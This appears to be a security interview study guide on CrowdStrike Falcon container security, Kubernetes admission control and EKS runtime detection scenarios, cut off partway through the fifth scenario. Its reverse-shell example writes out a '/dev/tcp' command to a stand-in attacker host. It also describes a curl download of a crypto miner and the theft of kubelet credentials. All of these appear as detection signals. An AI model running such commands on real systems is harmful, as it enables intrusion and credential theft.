# 🛡️ Cloud & Container Security — Unified Mastery Guide
## CrowdStrike Falcon CNAPP | AWS/EKS Security | Interview-Ready

> **Gopikrishna Vallepu** | Cloud & Container Security SME
> Prepared: February 2026

---

> This is a **single, comprehensive reference** that unifies all study materials into one document.
> It covers: CNAPP foundations → Falcon architecture → KAC deep dive → 15 runtime detection scenarios → 15 advanced attack scenarios → breach simulation → hands-on commands → interview frameworks → MITRE mapping → governance & compliance.

---

## 📑 Master Table of Contents

| Part | Title | Focus |
|------|-------|-------|
| **I** | Cloud Security Foundations | Shared responsibility, CNAPP components, EKS architecture |
| **II** | CrowdStrike Falcon Platform | Sensor deployment, CWPP/CSPM/CIEM capabilities, dashboards |
| **III** | Kubernetes Admission Controller (KAC) | Architecture, detection types, policy config, interview Q&A |
| **IV** | Runtime Detection Scenarios (15) | Container-level detections with signals, investigation, remediation |
| **V** | Advanced Attack Scenarios (15) | Full kill-chain scenarios with foothold → escalation → lateral movement → detection → containment |
| **VI** | Enterprise Breach Simulation | Multi-stage K8s breach with real Falcon telemetry and MITRE mapping |
| **VII** | Hands-On Command Reference | AWS IAM/STS, EKS/kubectl, CloudTrail, S3, Falcon queries |
| **VIII** | Interview Frameworks & Model Answers | Elevator pitch, incident framework, power phrases, Q&A |
| **IX** | Governance, Compliance & MITRE ATT&CK | CIS benchmarks, change management, audit evidence, MITRE cloud matrix |

---

---

# PART I: CLOUD SECURITY FOUNDATIONS

---

## 1.1 Shared Responsibility Model

- **Cloud Service Provider (CSP):** Security **"of"** the cloud (physical infrastructure, hypervisor, network fabric).
- **Customer:** Security **"in"** the cloud (data, IAM, OS patching, application security, network configuration).

## 1.2 Top Cloud Security Challenges

| Challenge | Description |
|-----------|-------------|
| Misconfigurations | Improperly secured resources (open S3 buckets, public APIs) |
| Identity & Access | Over-privileged IAM roles, dormant credentials |
| Workload Protection | Runtime threats inside containers, VMs, serverless |
| Compliance | Meeting CIS, NIST, PCI DSS, SOC 2, HIPAA requirements |
| Visibility | Multi-cloud, multi-account sprawl reduces security visibility |

## 1.3 Cloud Security Best Practices

1. **Use Identity and Access Management (IAM)** properly
2. **Encrypt Data** at Rest and in Transit
3. **Segment Networks** (VPCs, Subnets, Security Groups)
4. **Implement Multi-Factor Authentication (MFA)**
5. **Enable Logging and Monitoring**
6. **Automate Security Scanning in CI/CD Pipelines**
7. **Secure API Endpoints** (authentication, HTTPS, input validation)
8. **Keep Software and OS Up-to-Date**

## 1.4 DevSecOps

Security integrated into every stage of the development lifecycle. Shift-left approach — find and fix security issues early in development rather than in production.

---

## 1.5 CNAPP — Cloud-Native Application Protection Platform

CNAPP combines multiple cloud security capabilities into a unified platform:

| Component | Full Name | What It Does |
|-----------|-----------|-------------|
| **CWPP** | Cloud Workload Protection Platform | Runtime protection for hosts, containers, serverless |
| **CSPM** | Cloud Security Posture Management | Configuration auditing against security benchmarks |
| **CIEM** | Cloud Infrastructure Entitlement Management | Identity and permissions analysis, blast radius computation |
| **KAC** | Kubernetes Admission Controller | Pre-deployment policy enforcement for K8s workloads |
| **KSPM** | Kubernetes Security Posture Management | Monitors K8s environment, workloads, configurations |
| **IaC Scanning** | Infrastructure-as-Code Scanning | Scans Terraform/CloudFormation templates for misconfigurations |

### The Golden Rule
> NONE of these tools alone is sufficient. Breaches succeed when attackers exploit the gap between them. CWPP misses misconfigured S3 buckets. CSPM misses malware running in a container. CIEM shows the blast radius only after the fact without CWPP correlation. The power is in the correlation across all four — and the human process that acts on what they find.

| Tool | One-Line Summary | Analogy |
|------|-----------------|---------|
| CWPP | Watches what processes are doing INSIDE workloads, RIGHT NOW | Security camera inside the building |
| CSPM | Checks HOW cloud resources are configured vs. security best practices | Building code inspector |
| CIEM | "What can this identity DO and what is the blast radius if compromised?" | Access control risk analyst |
| KAC | Blocks non-compliant workloads BEFORE they deploy to the cluster | Security checkpoint at the door |

---

## 1.6 CWPP — Deep Dive

CWPP is the runtime guardian embedded inside your workloads — on the EC2 host, within containers, across EKS nodes. It operates at the syscall and process level, capturing what is happening in real time using eBPF-based telemetry.

| CWPP Capability | What It Detects |
|----------------|-----------------|
| Process Lineage Tree | Anomalous parent-child process relationships (webshell, reverse shell) |
| Container Drift Detection | New executables written post-start not in original image layers |
| Behavioral ML Models | Deviation from workload baseline — zero-day behavior without signatures |
| Runtime Kernel Protection | Dirty Pipe, Dirty Cow, and other kernel exploit syscall sequences |
| Interactive Session Detection | TTY/PTY shell allocation in production containers |
| Memory Protection | Process injection, credential scraping from memory |
| Network Intelligence | First-seen domains, C2 beacon patterns, DNS tunneling |

**Detect vs. Prevent Mode — Critical Operational Decision:**
- **DETECT mode:** Alert fires, SOC investigates — attacker may still complete the action
- **PREVENT mode:** Process killed mid-execution before malicious action completes
- Production containers should run PREVENT for: drift, container escape, kernel exploits, interactive sessions
- Never run DETECT-only for PREVENT-capable policies without documented risk acceptance

---

## 1.7 CSPM — Deep Dive

CSPM is the configuration auditor and compliance enforcer. It evaluates how your cloud infrastructure is configured against security benchmarks.

| CSPM Category | Key Controls |
|--------------|-------------|
| IAM Configuration | Root account active keys, no MFA, inline policies, PassRole chains |
| Network Configuration | SGs open to 0.0.0.0/0, NACLs, VPC peering misroutes |
| Data Security | S3 public access, unencrypted RDS, CloudTrail disabled |
| EKS / Kubernetes | Public API endpoint, no encryption, aws-auth misconfigurations |
| Compute | IMDSv1 enabled, SSM agent missing, public AMIs |
| Lambda | Admin roles attached, env vars with secrets, no VPC |
| Secrets & Keys | Unrotated keys, plaintext secrets in CloudFormation |

**CSPM Finding Lifecycle — The Failure Mode to Avoid:**
- Finding Created → Assigned to Team → Ignored (Org Debt) → Weaponized in Breach
- SLA enforcement is the most important CSPM operational control:
  - CRITICAL: 24-hour remediation SLA, CISO notification at 12 hours
  - HIGH: 48-hour SLA, team lead notification at 24 hours
  - MEDIUM: 7-day SLA, tracked in governance dashboard

---

## 1.8 CIEM — Deep Dive

CIEM answers the hardest question in cloud security: "If this identity is compromised, what can an attacker actually do?"

| CIEM Capability | Attack Surface Addressed |
|----------------|-------------------------|
| Effective Permission Graph | Shows what an identity can actually do including via role chains |
| Blast Radius Computation | Pre-computes worst-case impact before an incident occurs |
| Joiner-Mover-Leaver Tracking | Identifies orphaned credentials from terminated employees |
| Anomalous Assumption Detection | IRSA from external IP, dormant key activated, new geo |
| Privilege Escalation Path Detection | Maps all 21 Rhino Security Labs escalation paths |
| Shadow Admin Detection | Finds principals with effective admin via policy chains |

---

## 1.9 EKS Security Architecture — Key Knowledge Areas

**aws-auth ConfigMap:**
Maps IAM roles to Kubernetes RBAC groups. Never map any IAM role to system:masters in production. Use scoped custom ClusterRoles. Audit this ConfigMap weekly via CSPM.

**IRSA (IAM Roles for Service Accounts):**
Allows pods to assume IAM roles via OIDC. Every IRSA role trust policy must include aws:SourceVpc condition. Without it, the JWT extracted from a pod can be used from any IP address globally.

**Kubernetes Audit Logs:**
Enable and forward to CloudWatch/SIEM. Key verbs to alert on: exec, secrets list/get, rolebinding create, daemonset create in kube-system, configmap write in kube-system.

**Node Group Security:**
Managed nodes use AL2/AL2023 AMIs with SSM. Kubelet must run with --anonymous-auth=false and --authorization-mode=Webhook. Security groups must block port 10250 from all non-cluster sources.

**etcd Security:**
Encrypted at rest (AWS manages for EKS). For self-managed: mutual TLS required, port 2379 accessible only from API server CIDR, enable etcd audit logging.

---

## 1.10 Kubernetes Fundamentals

| Concept | Definition |
|---------|-----------|
| **Cluster** | A set of node machines for running containerized applications |
| **Control Plane** | Brain of the cluster — manages scheduling, API serving, etcd |
| **Node (Worker Node)** | A machine that runs Pods and keeps the cluster working smoothly |
| **Pod** | Holds a logical grouping of one or more containers, sharing resources |
| **Container** | A self-contained unit of software with the application, libraries, and dependencies |
| **Container Runtime** | Software responsible for running containers (containerd, CRI-O, runc) |
| **Namespace** | Virtual cluster within a physical cluster for resource isolation |
| **Service** | Network abstraction that exposes a set of Pods |
| **Deployment** | Desired state for Pods — handles scaling and rolling updates |
| **DaemonSet** | Ensures a copy of a Pod runs on each (or selected) node |

---

# PART II: CROWDSTRIKE FALCON PLATFORM

---

## 2.1 Falcon Sensor Deployment

### Sensor Options Comparison

| Feature | Falcon Sensor for Linux | Falcon Container Sensor for Linux |
|---------|------------------------|----------------------------------|
| **What it protects** | Linux hosts AND all containers on that host | Individual containers only (within a specific Pod) |
| **Installation** | Installed on the Linux host OS | Deployed as a sidecar container inside a Pod |
| **K8s Deployment** | DaemonSet (one per node) | Sidecar (one per Pod) |
| **Visibility** | Sees all processes across all containers + host | Only sees processes inside its own Pod |
| **Resource efficiency** | One sensor per node (efficient) | One sensor per Pod (higher resource usage) |
| **Best for** | EKS, AKS, GKE with OS access | Serverless or managed environments without host access |

### Decision Flowchart

| Question | Answer Yes | Answer No |
|----------|-----------|-----------|
| Running Kubernetes? | Deploy as DaemonSet | Go to Q2 |
| Control the underlying hosts/OS/cluster? | Falcon Sensor for Linux (on host) | Go to Q3 |
| OS and kernel supported by Falcon sensor? | Falcon Sensor for Linux | Falcon Container Sensor |

> **Best Practice:** Always use the Falcon Sensor for Linux when possible for maximum protection. Use the Container Sensor when host access isn't available.

### Installation Methods

| Method | Falcon Helm Chart | Falcon Operator |
|--------|-------------------|----------------|
| **Best for** | First-time installs, simple deployments | Ongoing lifecycle management, large environments |
| **Upgrades** | Manual `helm upgrade` | Auto-managed by the Operator |
| **Complexity** | Lower | Higher initial setup, but simpler long-term |

---

## 2.2 Falcon Cloud Security Modules

| Module | Function |
|--------|----------|
| **Dashboards** | The primary point for reviewing cloud security posture |
| **Cloud Accounts** | List of registered cloud accounts and registration health |
| **Activity** | Shows all cloud account activity and events |
| **Detections** | Secure containerized workloads and cloud-native applications |
| **Policies and Settings** | Customize Falcon Cloud Security for your environment |

### Security & Compliance

| Focus Area | Challenge | FCS Solution |
|------------|-----------|-------------|
| Compliance | Achieving regulatory compliance | Asset-level compliance dashboards, PDF export, automated evidence |
| Misconfigurations | Discovering and fixing cloud misconfigs | IOMs against CIS benchmarks, severity-based prioritization |
| Threat Detection | Identifying active threats in cloud workloads | IOAs (behavioral detection) + IOMs (configuration checks) |

---

## 2.3 Runtime Security & Container Protection

### Cloud Runtime Threat Landscape

**Why containers are targeted:**
| Attack Surface | Why It's Valuable |
|---------------|-------------------|
| Container images | Often include unpatched CVEs or embedded malware |
| Container runtime | Escape to host via kernel exploits (Dirty Pipe, runc bugs) |
| Orchestrator (K8s) | RBAC misconfigs, exposed API server, secrets enumeration |
| Cloud IAM | Over-privileged roles usable from compromised containers |
| CI/CD pipeline | Supply chain poisoning to inject malicious code |

**Attacker techniques at runtime:**
- Exploit weak authentication
- Deploy malware
- Use cloud management tools for lateral movement
- Maintain persistence through alternate authentication mechanisms
- Evade detection through indicator removal and security control bypass

### Falcon Runtime Protection Components

1. **Kubernetes Admission Controller (KAC)** — pre-deployment blocking
2. **Falcon Sensor (CWPP)** — real-time eBPF-based runtime detection
3. **Image Assessment** — vulnerability and malware scanning of container images

---

## 2.4 Container Lifecycle Monitoring

### Container Inventory Dashboards

Dashboard provides:
- Total containers, pods, nodes, and clusters
- Container sensor coverage percentage
- Container asset trends over last 7 days (identify unexpected spikes)

**Coverage calculation:** (Linux sensor-protected containers + Falcon container sensor-protected containers) ÷ total containers detected

### What Falcon Monitors

**Asset Metadata:**

| Asset | Metadata Tracked |
|-------|-----------------|
| Container | Name, ID, image, base OS, running since, agent version |
| Pod | Name, namespace, labels, node, cluster, IP address |
| Node | Type, instance ID, OS, external IP, cluster association |
| Cluster | Provider, version, connected nodes, registration status |

---

## 2.5 Prevention Policies & Drift Detection

### Drift Prevention Workflow

1. **Build Time:** Image scanned and approved (known-good state)
2. **Deploy Time:** Container starts from approved image
3. **Runtime:** Falcon monitors for any new executables written after container start
4. **Detection:** New binary written to `/tmp` → not in original image layers → **DRIFT EVENT**
5. **Prevention:** In PREVENT mode, Falcon kills the write/execution before the attacker can act

### Shift-Left Security Integration

- Integrate image scanning into CI/CD pipeline
- Block deployments with Critical CVEs at the pipeline stage
- Use KAC as a second gate if pipeline controls are bypassed

---

# PART III: KUBERNETES ADMISSION CONTROLLER (KAC) — DEEP DIVE

---


---

# PART IV: RUNTIME DETECTION SCENARIOS (15 Container-Level)

---

# 🛡️ Falcon KAC Deep Dive & Runtime Detection Scenarios Guide
### Interview-Ready | 15+ Scenarios | CrowdStrike Falcon Cloud Security

---

## Table of Contents

1. [KAC — How It Works (Architecture)](#1-kac--how-it-works)
2. [KAC — Detection Types & Use Cases](#2-kac--detection-types--use-cases)
3. [KAC — Scenario-Based Interview Questions](#3-kac--scenario-based-interview-questions)
4. [Runtime Detections — 15 Scenarios](#4-runtime-detections--15-scenarios)

---

## 1. KAC — How It Works

### What Problem Does KAC Solve?

Kubernetes makes deployment fast, but **misconfigurations happen constantly**:
- Developers deploy privileged containers by accident
- Images with critical CVEs run in production
- Secrets end up in pod specs
- Containers run as root with host network access

The **Falcon Kubernetes Admission Controller (KAC)** acts as a **security gatekeeper** — it intercepts every request to the K8s API server and decides: **Allow, Alert, or Block**.

### Where KAC Sits in the Request Lifecycle

```
 Developer runs: kubectl apply -f deployment.yaml
        │
        ▼
 ┌──────────────────────────────────┐
 │     K8s API Server               │
 │  1. Authentication (who are you?)│
 │  2. Authorization  (RBAC check)  │
 │  3. Admission Control ◄──────────┼──── KAC intercepts HERE
 │     ├─ Mutating webhooks         │
 │     └─ Validating webhooks ◄─────┼──── Falcon KAC = Validating Webhook
 │  4. Persist to etcd              │
 └──────────────────────────────────┘
        │
        ▼
 Pod is created (or BLOCKED by KAC)
```

**Key point:** KAC operates AFTER authentication and authorization but BEFORE the object is persisted. This means a misconfigured pod **never runs** — it's stopped at the gate.

### KAC Pod Architecture (3 Containers in 1 Pod)

```
┌─────────────────────────────────────────────────────────────┐
│                    KAC Pod (on worker node)                  │
│                                                             │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────┐ │
│  │  falcon-client   │  │   falcon-ac      │  │falcon-watcher│ │
│  │                 │  │                 │  │             │ │
│  │ Validating      │  │ Admission       │  │ Snapshot    │ │
│  │ Webhook         │  │ Controller      │  │ Monitor     │ │
│  │                 │  │                 │  │             │ │
│  │ • Listens to    │  │ • Policy mgmt   │  │ • Snapshots │ │
│  │   K8s API       │  │ • Cloud comms   │  │   K8s       │ │
│  │   events        │  │ • Event         │  │   objects   │ │
│  │ • Forwards to   │  │   handling      │  │ • Streams   │ │
│  │   falcon-ac     │  │ • Talks to      │  │   events to │ │
│  │                 │  │   CrowdStrike   │  │   CS cloud  │ │
│  │                 │  │   cloud         │  │             │ │
│  └─────────────────┘  └─────────────────┘  └─────────────┘ │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

| Container | Role | What It Does |
|-----------|------|-------------|
| **falcon-client** | Validating Webhook | Listens to K8s API server events. When a pod/deployment is created or updated, it intercepts the request and forwards it to `falcon-ac` for policy evaluation |
| **falcon-ac** | Admission Controller | The brain — evaluates the object against KAC policies and image assessment policies stored in the CrowdStrike cloud. Returns Allow/Deny decision |
| **falcon-watcher** | Continuous Monitor | Takes periodic snapshots of ALL K8s objects (pods, deployments, services). Streams create/update/delete events to CrowdStrike cloud as `K8SResource` events for continuous visibility |

### How a KAC Decision Happens (Step by Step)

```
1. Developer: kubectl apply -f pod.yaml
       │
       ▼
2. K8s API Server authenticates & authorizes the user
       │
       ▼
3. API Server sends AdmissionReview request to falcon-client webhook
       │
       ▼
4. falcon-client forwards the request to falcon-ac
       │
       ▼
5. falcon-ac evaluates against TWO policy types:
       │
       ├── A) Admission Control Policies (IOM rules)
       │       • Is the container privileged?
       │       • Is it running as root?
       │       • Does it have host network access?
       │       • Does it mount host paths?
       │       • Does it have excessive capabilities?
       │
       └── B) Image Assessment Policies
               • Has this image been scanned?
               • Does it have critical/high CVEs?
               • Does it have malware?
               • Does it have leaked credentials?
       │
       ▼
6. falcon-ac returns decision:
       • ALLOW   → Pod is created normally
       • ALERT   → Pod is created, but detection is raised in Falcon console
       • PREVENT → Pod creation is BLOCKED. kubectl returns error to user
```

### KAC Policy Configuration

**Navigate to:** `Cloud Security > Rules and Policies > Policies > Admission Control Policies`

**Policy Components:**

| Component | Purpose | Example |
|-----------|---------|---------|
| **Rule Groups** | Define which K8s resources the policy applies to | "All pods in production namespace" |
| **Host Groups** | Connect the policy to the KAC on specific clusters | Dynamic host group by K8s Cluster ID |
| **Namespaces** | Target specific virtual clusters | `production`, `staging` |
| **Pod/Service Labels** | Precise targeting of specific workloads | `app=payment-service` |
| **IOM Rules** | Set action per misconfiguration type | Privileged → Prevent, HostPath → Alert |
| **Image Assessment** | Act on image scan results | Unassessed images → Prevent |

### Why KAC is Critical (Interview Answer)

> "KAC is the **shift-left enforcement point** in Kubernetes security. Unlike runtime detection which catches problems after they happen, KAC **prevents** misconfigured workloads from ever reaching the runtime environment. It sits as a validating webhook in the K8s admission pipeline, evaluating every pod creation/update against two policy types: IOM rules (detecting misconfigurations like privileged containers) and image assessment policies (blocking images with vulnerabilities). The key architectural detail is that KAC runs 3 containers in one pod — the webhook interceptor, the policy engine that talks to CrowdStrike cloud, and a watcher that provides continuous inventory visibility. I recommend a phased rollout: start with Alert on all rules, monitor for 2-4 weeks, then switch critical rules to Prevent."

---

## 2. KAC — Detection Types & Use Cases

### KAC Detection Categories

#### A) Indicators of Misconfiguration (IOMs)

| IOM Detection | Risk Level | What It Detects | Why It Matters |
|---------------|-----------|-----------------|----------------|
| **Privileged Container** | 🔴 Critical | `securityContext.privileged: true` | Container has full host access — breakout is trivial |
| **Running as Root** | 🔴 Critical | `runAsUser: 0` or no `runAsNonRoot: true` | Root in container = root on host if breakout occurs |
| **Host Network Access** | 🔴 Critical | `hostNetwork: true` | Container shares host network — can sniff all node traffic |
| **Host PID Namespace** | 🔴 Critical | `hostPID: true` | Container can see and kill host processes |
| **Host IPC Namespace** | 🟠 High | `hostIPC: true` | Container can access host shared memory |
| **HostPath Volume Mount** | 🟠 High | Mounting `/`, `/etc`, `/var` from host | Direct access to host filesystem |
| **Excessive Capabilities** | 🟠 High | `CAP_SYS_ADMIN`, `CAP_NET_RAW`, etc. | Grants kernel-level powers to the container |
| **No Resource Limits** | 🟡 Medium | Missing `resources.limits` | Enables resource exhaustion (DoS) |
| **Writable Root Filesystem** | 🟡 Medium | `readOnlyRootFilesystem: false` | Allows attackers to write binaries/scripts |
| **Secrets in Environment** | 🟠 High | Secrets passed as plain env vars | Secrets visible in `kubectl describe pod` and process listings |

#### B) Image Assessment Detections

| Detection | What It Finds | Impact |
|-----------|---------------|--------|
| **Unassessed Image** | Image has never been scanned | Unknown vulnerabilities running in production |
| **Critical CVE in Image** | Known exploitable vulnerability (e.g., Log4Shell) | Active exploitation risk |
| **Malware in Image** | Known malicious binary in image layers | Compromised supply chain |
| **Credentials in Image** | AWS keys, Slack tokens, GCP creds in image | Credential theft from image scan |
| **SetUID Bit Found** | Binary with SetUID flag — privilege escalation vector | Attacker can escalate to root |
| **Running as Root in Dockerfile** | No `USER` instruction — defaults to root | Unnecessary privilege |
| **ADD Instruction** | `ADD` instead of `COPY` in Dockerfile | Can pull from remote URLs — injection risk |

#### C) KAC Compliance Detections

| Detection | Benchmark | Rule |
|-----------|-----------|------|
| **Container can acquire additional privileges** | CIS Docker 5.25 | Ensure `allowPrivilegeEscalation: false` |
| **Root group execution** | CIS K8s 5.2.6 | Ensure containers run with non-root group |
| **Missing seccomp profile** | CIS K8s 5.7.2 | Ensure Seccomp profile is set |
| **Missing AppArmor profile** | CIS K8s 5.7.1 | Ensure AppArmor profile is set |

### KAC Use Case: Real-World Workflow

**Scenario:** Your organization has 50 microservices on EKS. A developer pushes a new deployment with `privileged: true` because their monitoring tool "needs it."

**Without KAC:**
1. Pod deploys to production
2. Runs for days/weeks unnoticed
3. Attacker exploits application vulnerability → trivial container breakout
4. Full cluster compromise

**With KAC (Prevent Mode):**
1. Developer runs `kubectl apply`
2. KAC intercepts the AdmissionReview request
3. falcon-ac checks: `privileged: true` → rule set to **Prevent**
4. kubectl returns: `Error from server: admission webhook "falcon-kac" denied the request: privileged containers are not allowed`
5. Developer contacts security team
6. Security team identifies the specific capability needed (e.g., `CAP_NET_ADMIN`)
7. Pod is reconfigured with the minimum required capability, not full `privileged`
8. Deployment succeeds with least privilege

---

## 3. KAC — Scenario-Based Interview Questions

### Q1: "How would you roll out KAC policies in a production environment without causing outages?"

**Answer:**
> "I follow a **three-phase rollout strategy**:
> - **Phase 1 (Weeks 1-2): Monitor Only** — Deploy KAC with ALL rules set to **Alert**. No workloads are blocked. This creates a baseline of all current misconfigurations across the cluster.
> - **Phase 2 (Weeks 3-4): Selective Prevention** — Analyze the alert data. Identify misconfigurations that are clearly unintentional (e.g., no developer needs `hostPID: true`). Switch those rules to **Prevent**. Keep debatable rules on Alert.
> - **Phase 3 (Week 5+): Full Prevention** — Work with development teams to remediate remaining Alert findings. Switch critical rules (`privileged`, `running as root`, `host network`) to **Prevent**.
>
> The key is the dynamic host group — I create a group filtered by K8s Cluster ID. This lets me roll out policies per cluster, starting with staging before production."

---

### Q2: "A KAC policy is set to Prevent, and suddenly a critical production deployment fails. What do you do?"

**Answer:**
> "Immediate response is **business continuity first**:
> 1. **Identify the blocking rule** — check the Falcon console under Detections for the KAC alert. The detail panel shows exactly which IOM rule or image assessment policy blocked the deployment.
> 2. **Assess the risk** — is this a legitimate business-critical deployment? If yes, proceed to step 3.
> 3. **Temporary exemption** — I do NOT disable the entire policy. Instead, I create a **namespace-scoped exception** in the KAC policy rule group to allow this specific workload temporarily, or switch that specific rule to Alert for the affected namespace.
> 4. **Document and time-bound** — create a ticket with a 7-day deadline for the team to fix the underlying misconfiguration.
> 5. **Post-incident** — work with the dev team to remediate the root cause and remove the exception.
>
> I never globally disable prevention because one team's emergency. That would leave the entire cluster exposed."

---

### Q3: "How does KAC help with container supply chain security?"

**Answer:**
> "KAC integrates with Image Assessment Policies, which is the supply chain security layer:
> 1. **Pre-runtime scanning** — Images are scanned in the CI/CD pipeline or registry for CVEs, malware, credentials, and misconfigurations.
> 2. **Admission-time enforcement** — When a pod is created, KAC checks if the image has been assessed. If it's unassessed, I set the policy to **Prevent** — unknown images do not run.
> 3. **Vulnerability threshold** — I can configure KAC to block images with Critical or High CVEs, even if they've been scanned.
> 4. **Continuous reassessment** — Image Assessment at Runtime (IAR) continuously re-scans running images. If a new CVE is published that affects a running image, it appears in the console for remediation.
>
> This creates a closed-loop: nothing runs without scanning, nothing with critical vulnerabilities runs, and running images are continuously reassessed."

---

### Q4: "What's the difference between KAC and Pod Security Standards/OPA Gatekeeper?"

**Answer:**
> "They serve similar functions but with different strengths:
>
> | Feature | KAC | Pod Security Standards (PSA) | OPA/Gatekeeper |
> |---------|-----|----------------------------|----------------|
> | **Deployment** | CrowdStrike-managed, Helm install | Built into K8s 1.25+ | Self-managed policy engine |
> | **Policy management** | CrowdStrike cloud console | Namespace labels | Rego policy language |
> | **Image scanning** | ✅ Integrated image assessment | ❌ No image scanning | ❌ No image scanning |
> | **Continuous monitoring** | ✅ falcon-watcher streams state | ❌ Admission-time only | ❌ Admission-time only |
> | **Cloud visibility** | ✅ Centralized in Falcon console | ❌ Local cluster only | ❌ Local cluster only |
> | **MITRE ATT&CK mapping** | ✅ Tactic/technique for each IOM | ❌ | ❌ |
>
> In enterprise environments, I use KAC as the **primary enforcement** because it provides centralized visibility, image assessment integration, and MITRE mapping. I may use PSA as a **defense-in-depth layer** for clusters outside CrowdStrike coverage."

---

### Q5: "KAC detected a 'Secret' type misconfiguration. What does this mean and how do you investigate?"

**Answer:**
> "A 'Secret' type IOM means KAC found **sensitive information embedded directly in the K8s object spec** — this could be:
> - An API key in an environment variable (`env.value: sk-live-abc123...`)
> - A database password in a ConfigMap instead of a K8s Secret
> - An AWS access key hardcoded in the pod spec
>
> **Investigation:**
> 1. Check the IOM detail panel — it shows the exact field and value that triggered the detection.
> 2. Determine if the secret is valid — use the key/credential to check if it's active (e.g., `aws sts get-caller-identity` for AWS keys).
> 3. If valid: **rotate the credential immediately** — it's already been stored in `etcd`, K8s audit logs, and potentially SCM history.
> 4. Remediate: migrate the secret to K8s Secrets (encrypted at rest using KMS), or better yet, use an external secrets manager (HashiCorp Vault, AWS Secrets Manager) with a CSI driver.
> 5. Set the KAC rule for secrets to **Prevent** to block future occurrences."

---

## 4. Runtime Detections — 15 Scenarios

> Each scenario follows the format: **What Happened → Detection Signal → Investigation → Risk → Remediation → Interview Answer**

---

### Scenario 1: Reverse Shell from a Container

**What Happened:** An attacker exploited an RCE vulnerability in a web application running inside a K8s pod. They spawned a reverse shell back to their C2 server.

**Detection Signals:**
- **Falcon IOA:** `ReverseShellDetected` — outbound TCP connection from a shell process
- **Process Tree:** `node` → `sh` → `bash -i >& /dev/tcp/attacker-ip/4444 0>&1`
- **Drift Indicator:** `bash` not present in the original container image
- **Network:** Outbound connection to non-standard port (4444)

**Investigation:**
1. Open the detection → examine the **process tree** (parent→child chain)
2. Check **drift indicators** — was the shell binary in the original image?
3. Check the **network connection** details — destination IP, port, bytes transferred
4. Check if the attacker accessed the **service account token** at `/var/run/secrets/kubernetes.io/serviceaccount/token`
5. Check if the attacker queried the **IMDS** at `169.254.169.254`

**Risk:** Critical — interactive access to the container, potential K8s API access and credential theft.

**Remediation:** Kill the pod, patch the vulnerability, set `readOnlyRootFilesystem: true`, deploy default-deny NetworkPolicies, disable SA token automounting.

**Interview Answer:**
> "I detect reverse shells primarily through Falcon's process tree — a web server should never spawn `bash`. The drift indicator confirms the shell wasn't in the image. My immediate action is to kill the pod and apply a deny-all NetworkPolicy. Long-term, I enforce `readOnlyRootFilesystem` and default-deny egress."

---

### Scenario 2: Container Running as Root

**What Happened:** A pod was deployed without a `securityContext` — defaults to running as root (UID 0).

**Detection Signals:**
- **KAC IOM:** `RunningAsRootContainer` — `runAsUser: 0` or `runAsNonRoot` not set
- **Runtime Detection:** Process executions under UID 0 inside the container
- **Image Detection:** `UserInstructionNotInDockerfile`

**Investigation:**
1. Check the pod spec — is there a `securityContext` with `runAsNonRoot: true`?
2. Check the Dockerfile — does it have a `USER` instruction?
3. Determine if running as root is actually required (usually it isn't)

**Risk:** High — if the container is compromised, the attacker has root privileges, making breakout easier.

**Remediation:** Add `runAsNonRoot: true` and `runAsUser: 1000` to the pod/container securityContext. Add `USER nonroot` to the Dockerfile. Set KAC to **Prevent** for this IOM.

**Interview Answer:**
> "Running as root is one of the most common K8s misconfigurations. I enforce it at two layers: KAC prevents pods without `runAsNonRoot: true` from deploying, and our CI/CD pipeline rejects Dockerfiles without a `USER` instruction."

---

### Scenario 3: Privileged Container Breakout

**What Happened:** A pod with `privileged: true` was compromised. The attacker mounted the host filesystem and stole the Kubelet kubeconfig.

**Detection Signals:**
- **Falcon Runtime:** `PotentialKernelTampering` — `mount` syscall from within a container
- **Drift:** `mount`, `nsenter`, `chroot` executed inside the container
- **KAC IOM:** `Privileged Container` (if KAC was in Alert mode, not Prevent)
- **File Access:** Read of `/var/lib/kubelet/kubeconfig`

**Investigation:**
1. Process tree: What binary executed the `mount` syscall?
2. Drift indicators: Were tools like `mount`, `fdisk`, `nsenter` brought into the container?
3. File access: Did any process read Kubelet credentials?
4. K8s audit logs: Were cluster secrets accessed using those credentials?
5. **Assume full cluster compromise** if Kubelet creds were accessed.

**Risk:** Critical — single container → full cluster compromise → all secrets exposed.

**Remediation:** Kill the pod, cordon the node, rotate ALL cluster secrets, set KAC to **Prevent** for privileged containers, enforce Pod Security Standards `restricted` profile.

**Interview Answer:**
> "A privileged container breakout is the worst-case K8s scenario. When I see Falcon's `PotentialKernelTampering` alert showing a mount syscall from a container, I assume the node is compromised. Immediate actions: kill the pod, cordon+drain the node, rotate all cluster secrets. Prevention is key — KAC should never allow `privileged: true` in production."

---

### Scenario 4: Container Drift — Crypto Miner Downloaded

**What Happened:** An attacker exploited a vulnerability and used `curl` to download a crypto miner binary into the container. The container's CPU usage spiked to 100%.

**Detection Signals:**
- **Drift Indicator:** `curl` executed to download `/tmp/xmrig` — binary not in original image
- **Drift Indicator:** `/tmp/xmrig` executed — new binary launched
- **Falcon IOA:** `SuspiciousProcessExecution` — unknown binary with high CPU usage
- **Network:** Outbound connection to a mining pool IP (e.g., `pool.minexmr.com:4444`)

**Investigation:**
1. Check drift indicators — what was downloaded and from where?
2. Check the binary hash against VirusTotal / threat intelligence
3. Check network connections — mining pool domains/IPs
4. Check how the attacker got in (application vulnerability, exposed service)

**Risk:** High — resource theft + indicates the attacker has code execution.

**Remediation:** Kill the pod, patch the application, enforce `readOnlyRootFilesystem: true` (prevents writing to `/tmp`), enable drift prevention to auto-kill drifted processes, restrict egress with NetworkPolicies.

**Interview Answer:**
> "Crypto mining in containers is extremely common because containers often have unrestricted egress. Falcon's drift detection catches this immediately — `curl` downloading a binary that wasn't in the image. If drift prevention is enabled, Falcon kills `xmrig` the moment it executes. My prevention strategy: `readOnlyRootFilesystem`, default-deny egress NetworkPolicies, and drift prevention enabled."

---

### Scenario 5: Suspicious kubectl exec (Interactive Intrusion)

**What Happened:** An attacker compromised a developer's `kubeconfig` and used `kubectl exec` to get interactive shell access to a production pod.

**Detection Signals:**
- **K8s Audit Log:** `pods/exec` API call with unexpected service account or user
- **Falcon Runtime:** Interactive shell session detected — `sh`/`bash` spawned by container's entrypoint
- **Falcon IOA:** `InteractiveIntrusion` — mimics admin behavior
- **Network:** Internal connections from the pod to database services

**Investigation:**
1. Who authenticated? Check K8s audit logs for the `userIdentity` on the `exec` call
2. Where did the request originate? Check source IP — is it from a corporate network or an unknown IP?
3. What commands were run? Review Falcon's process tree for all commands in the interactive session
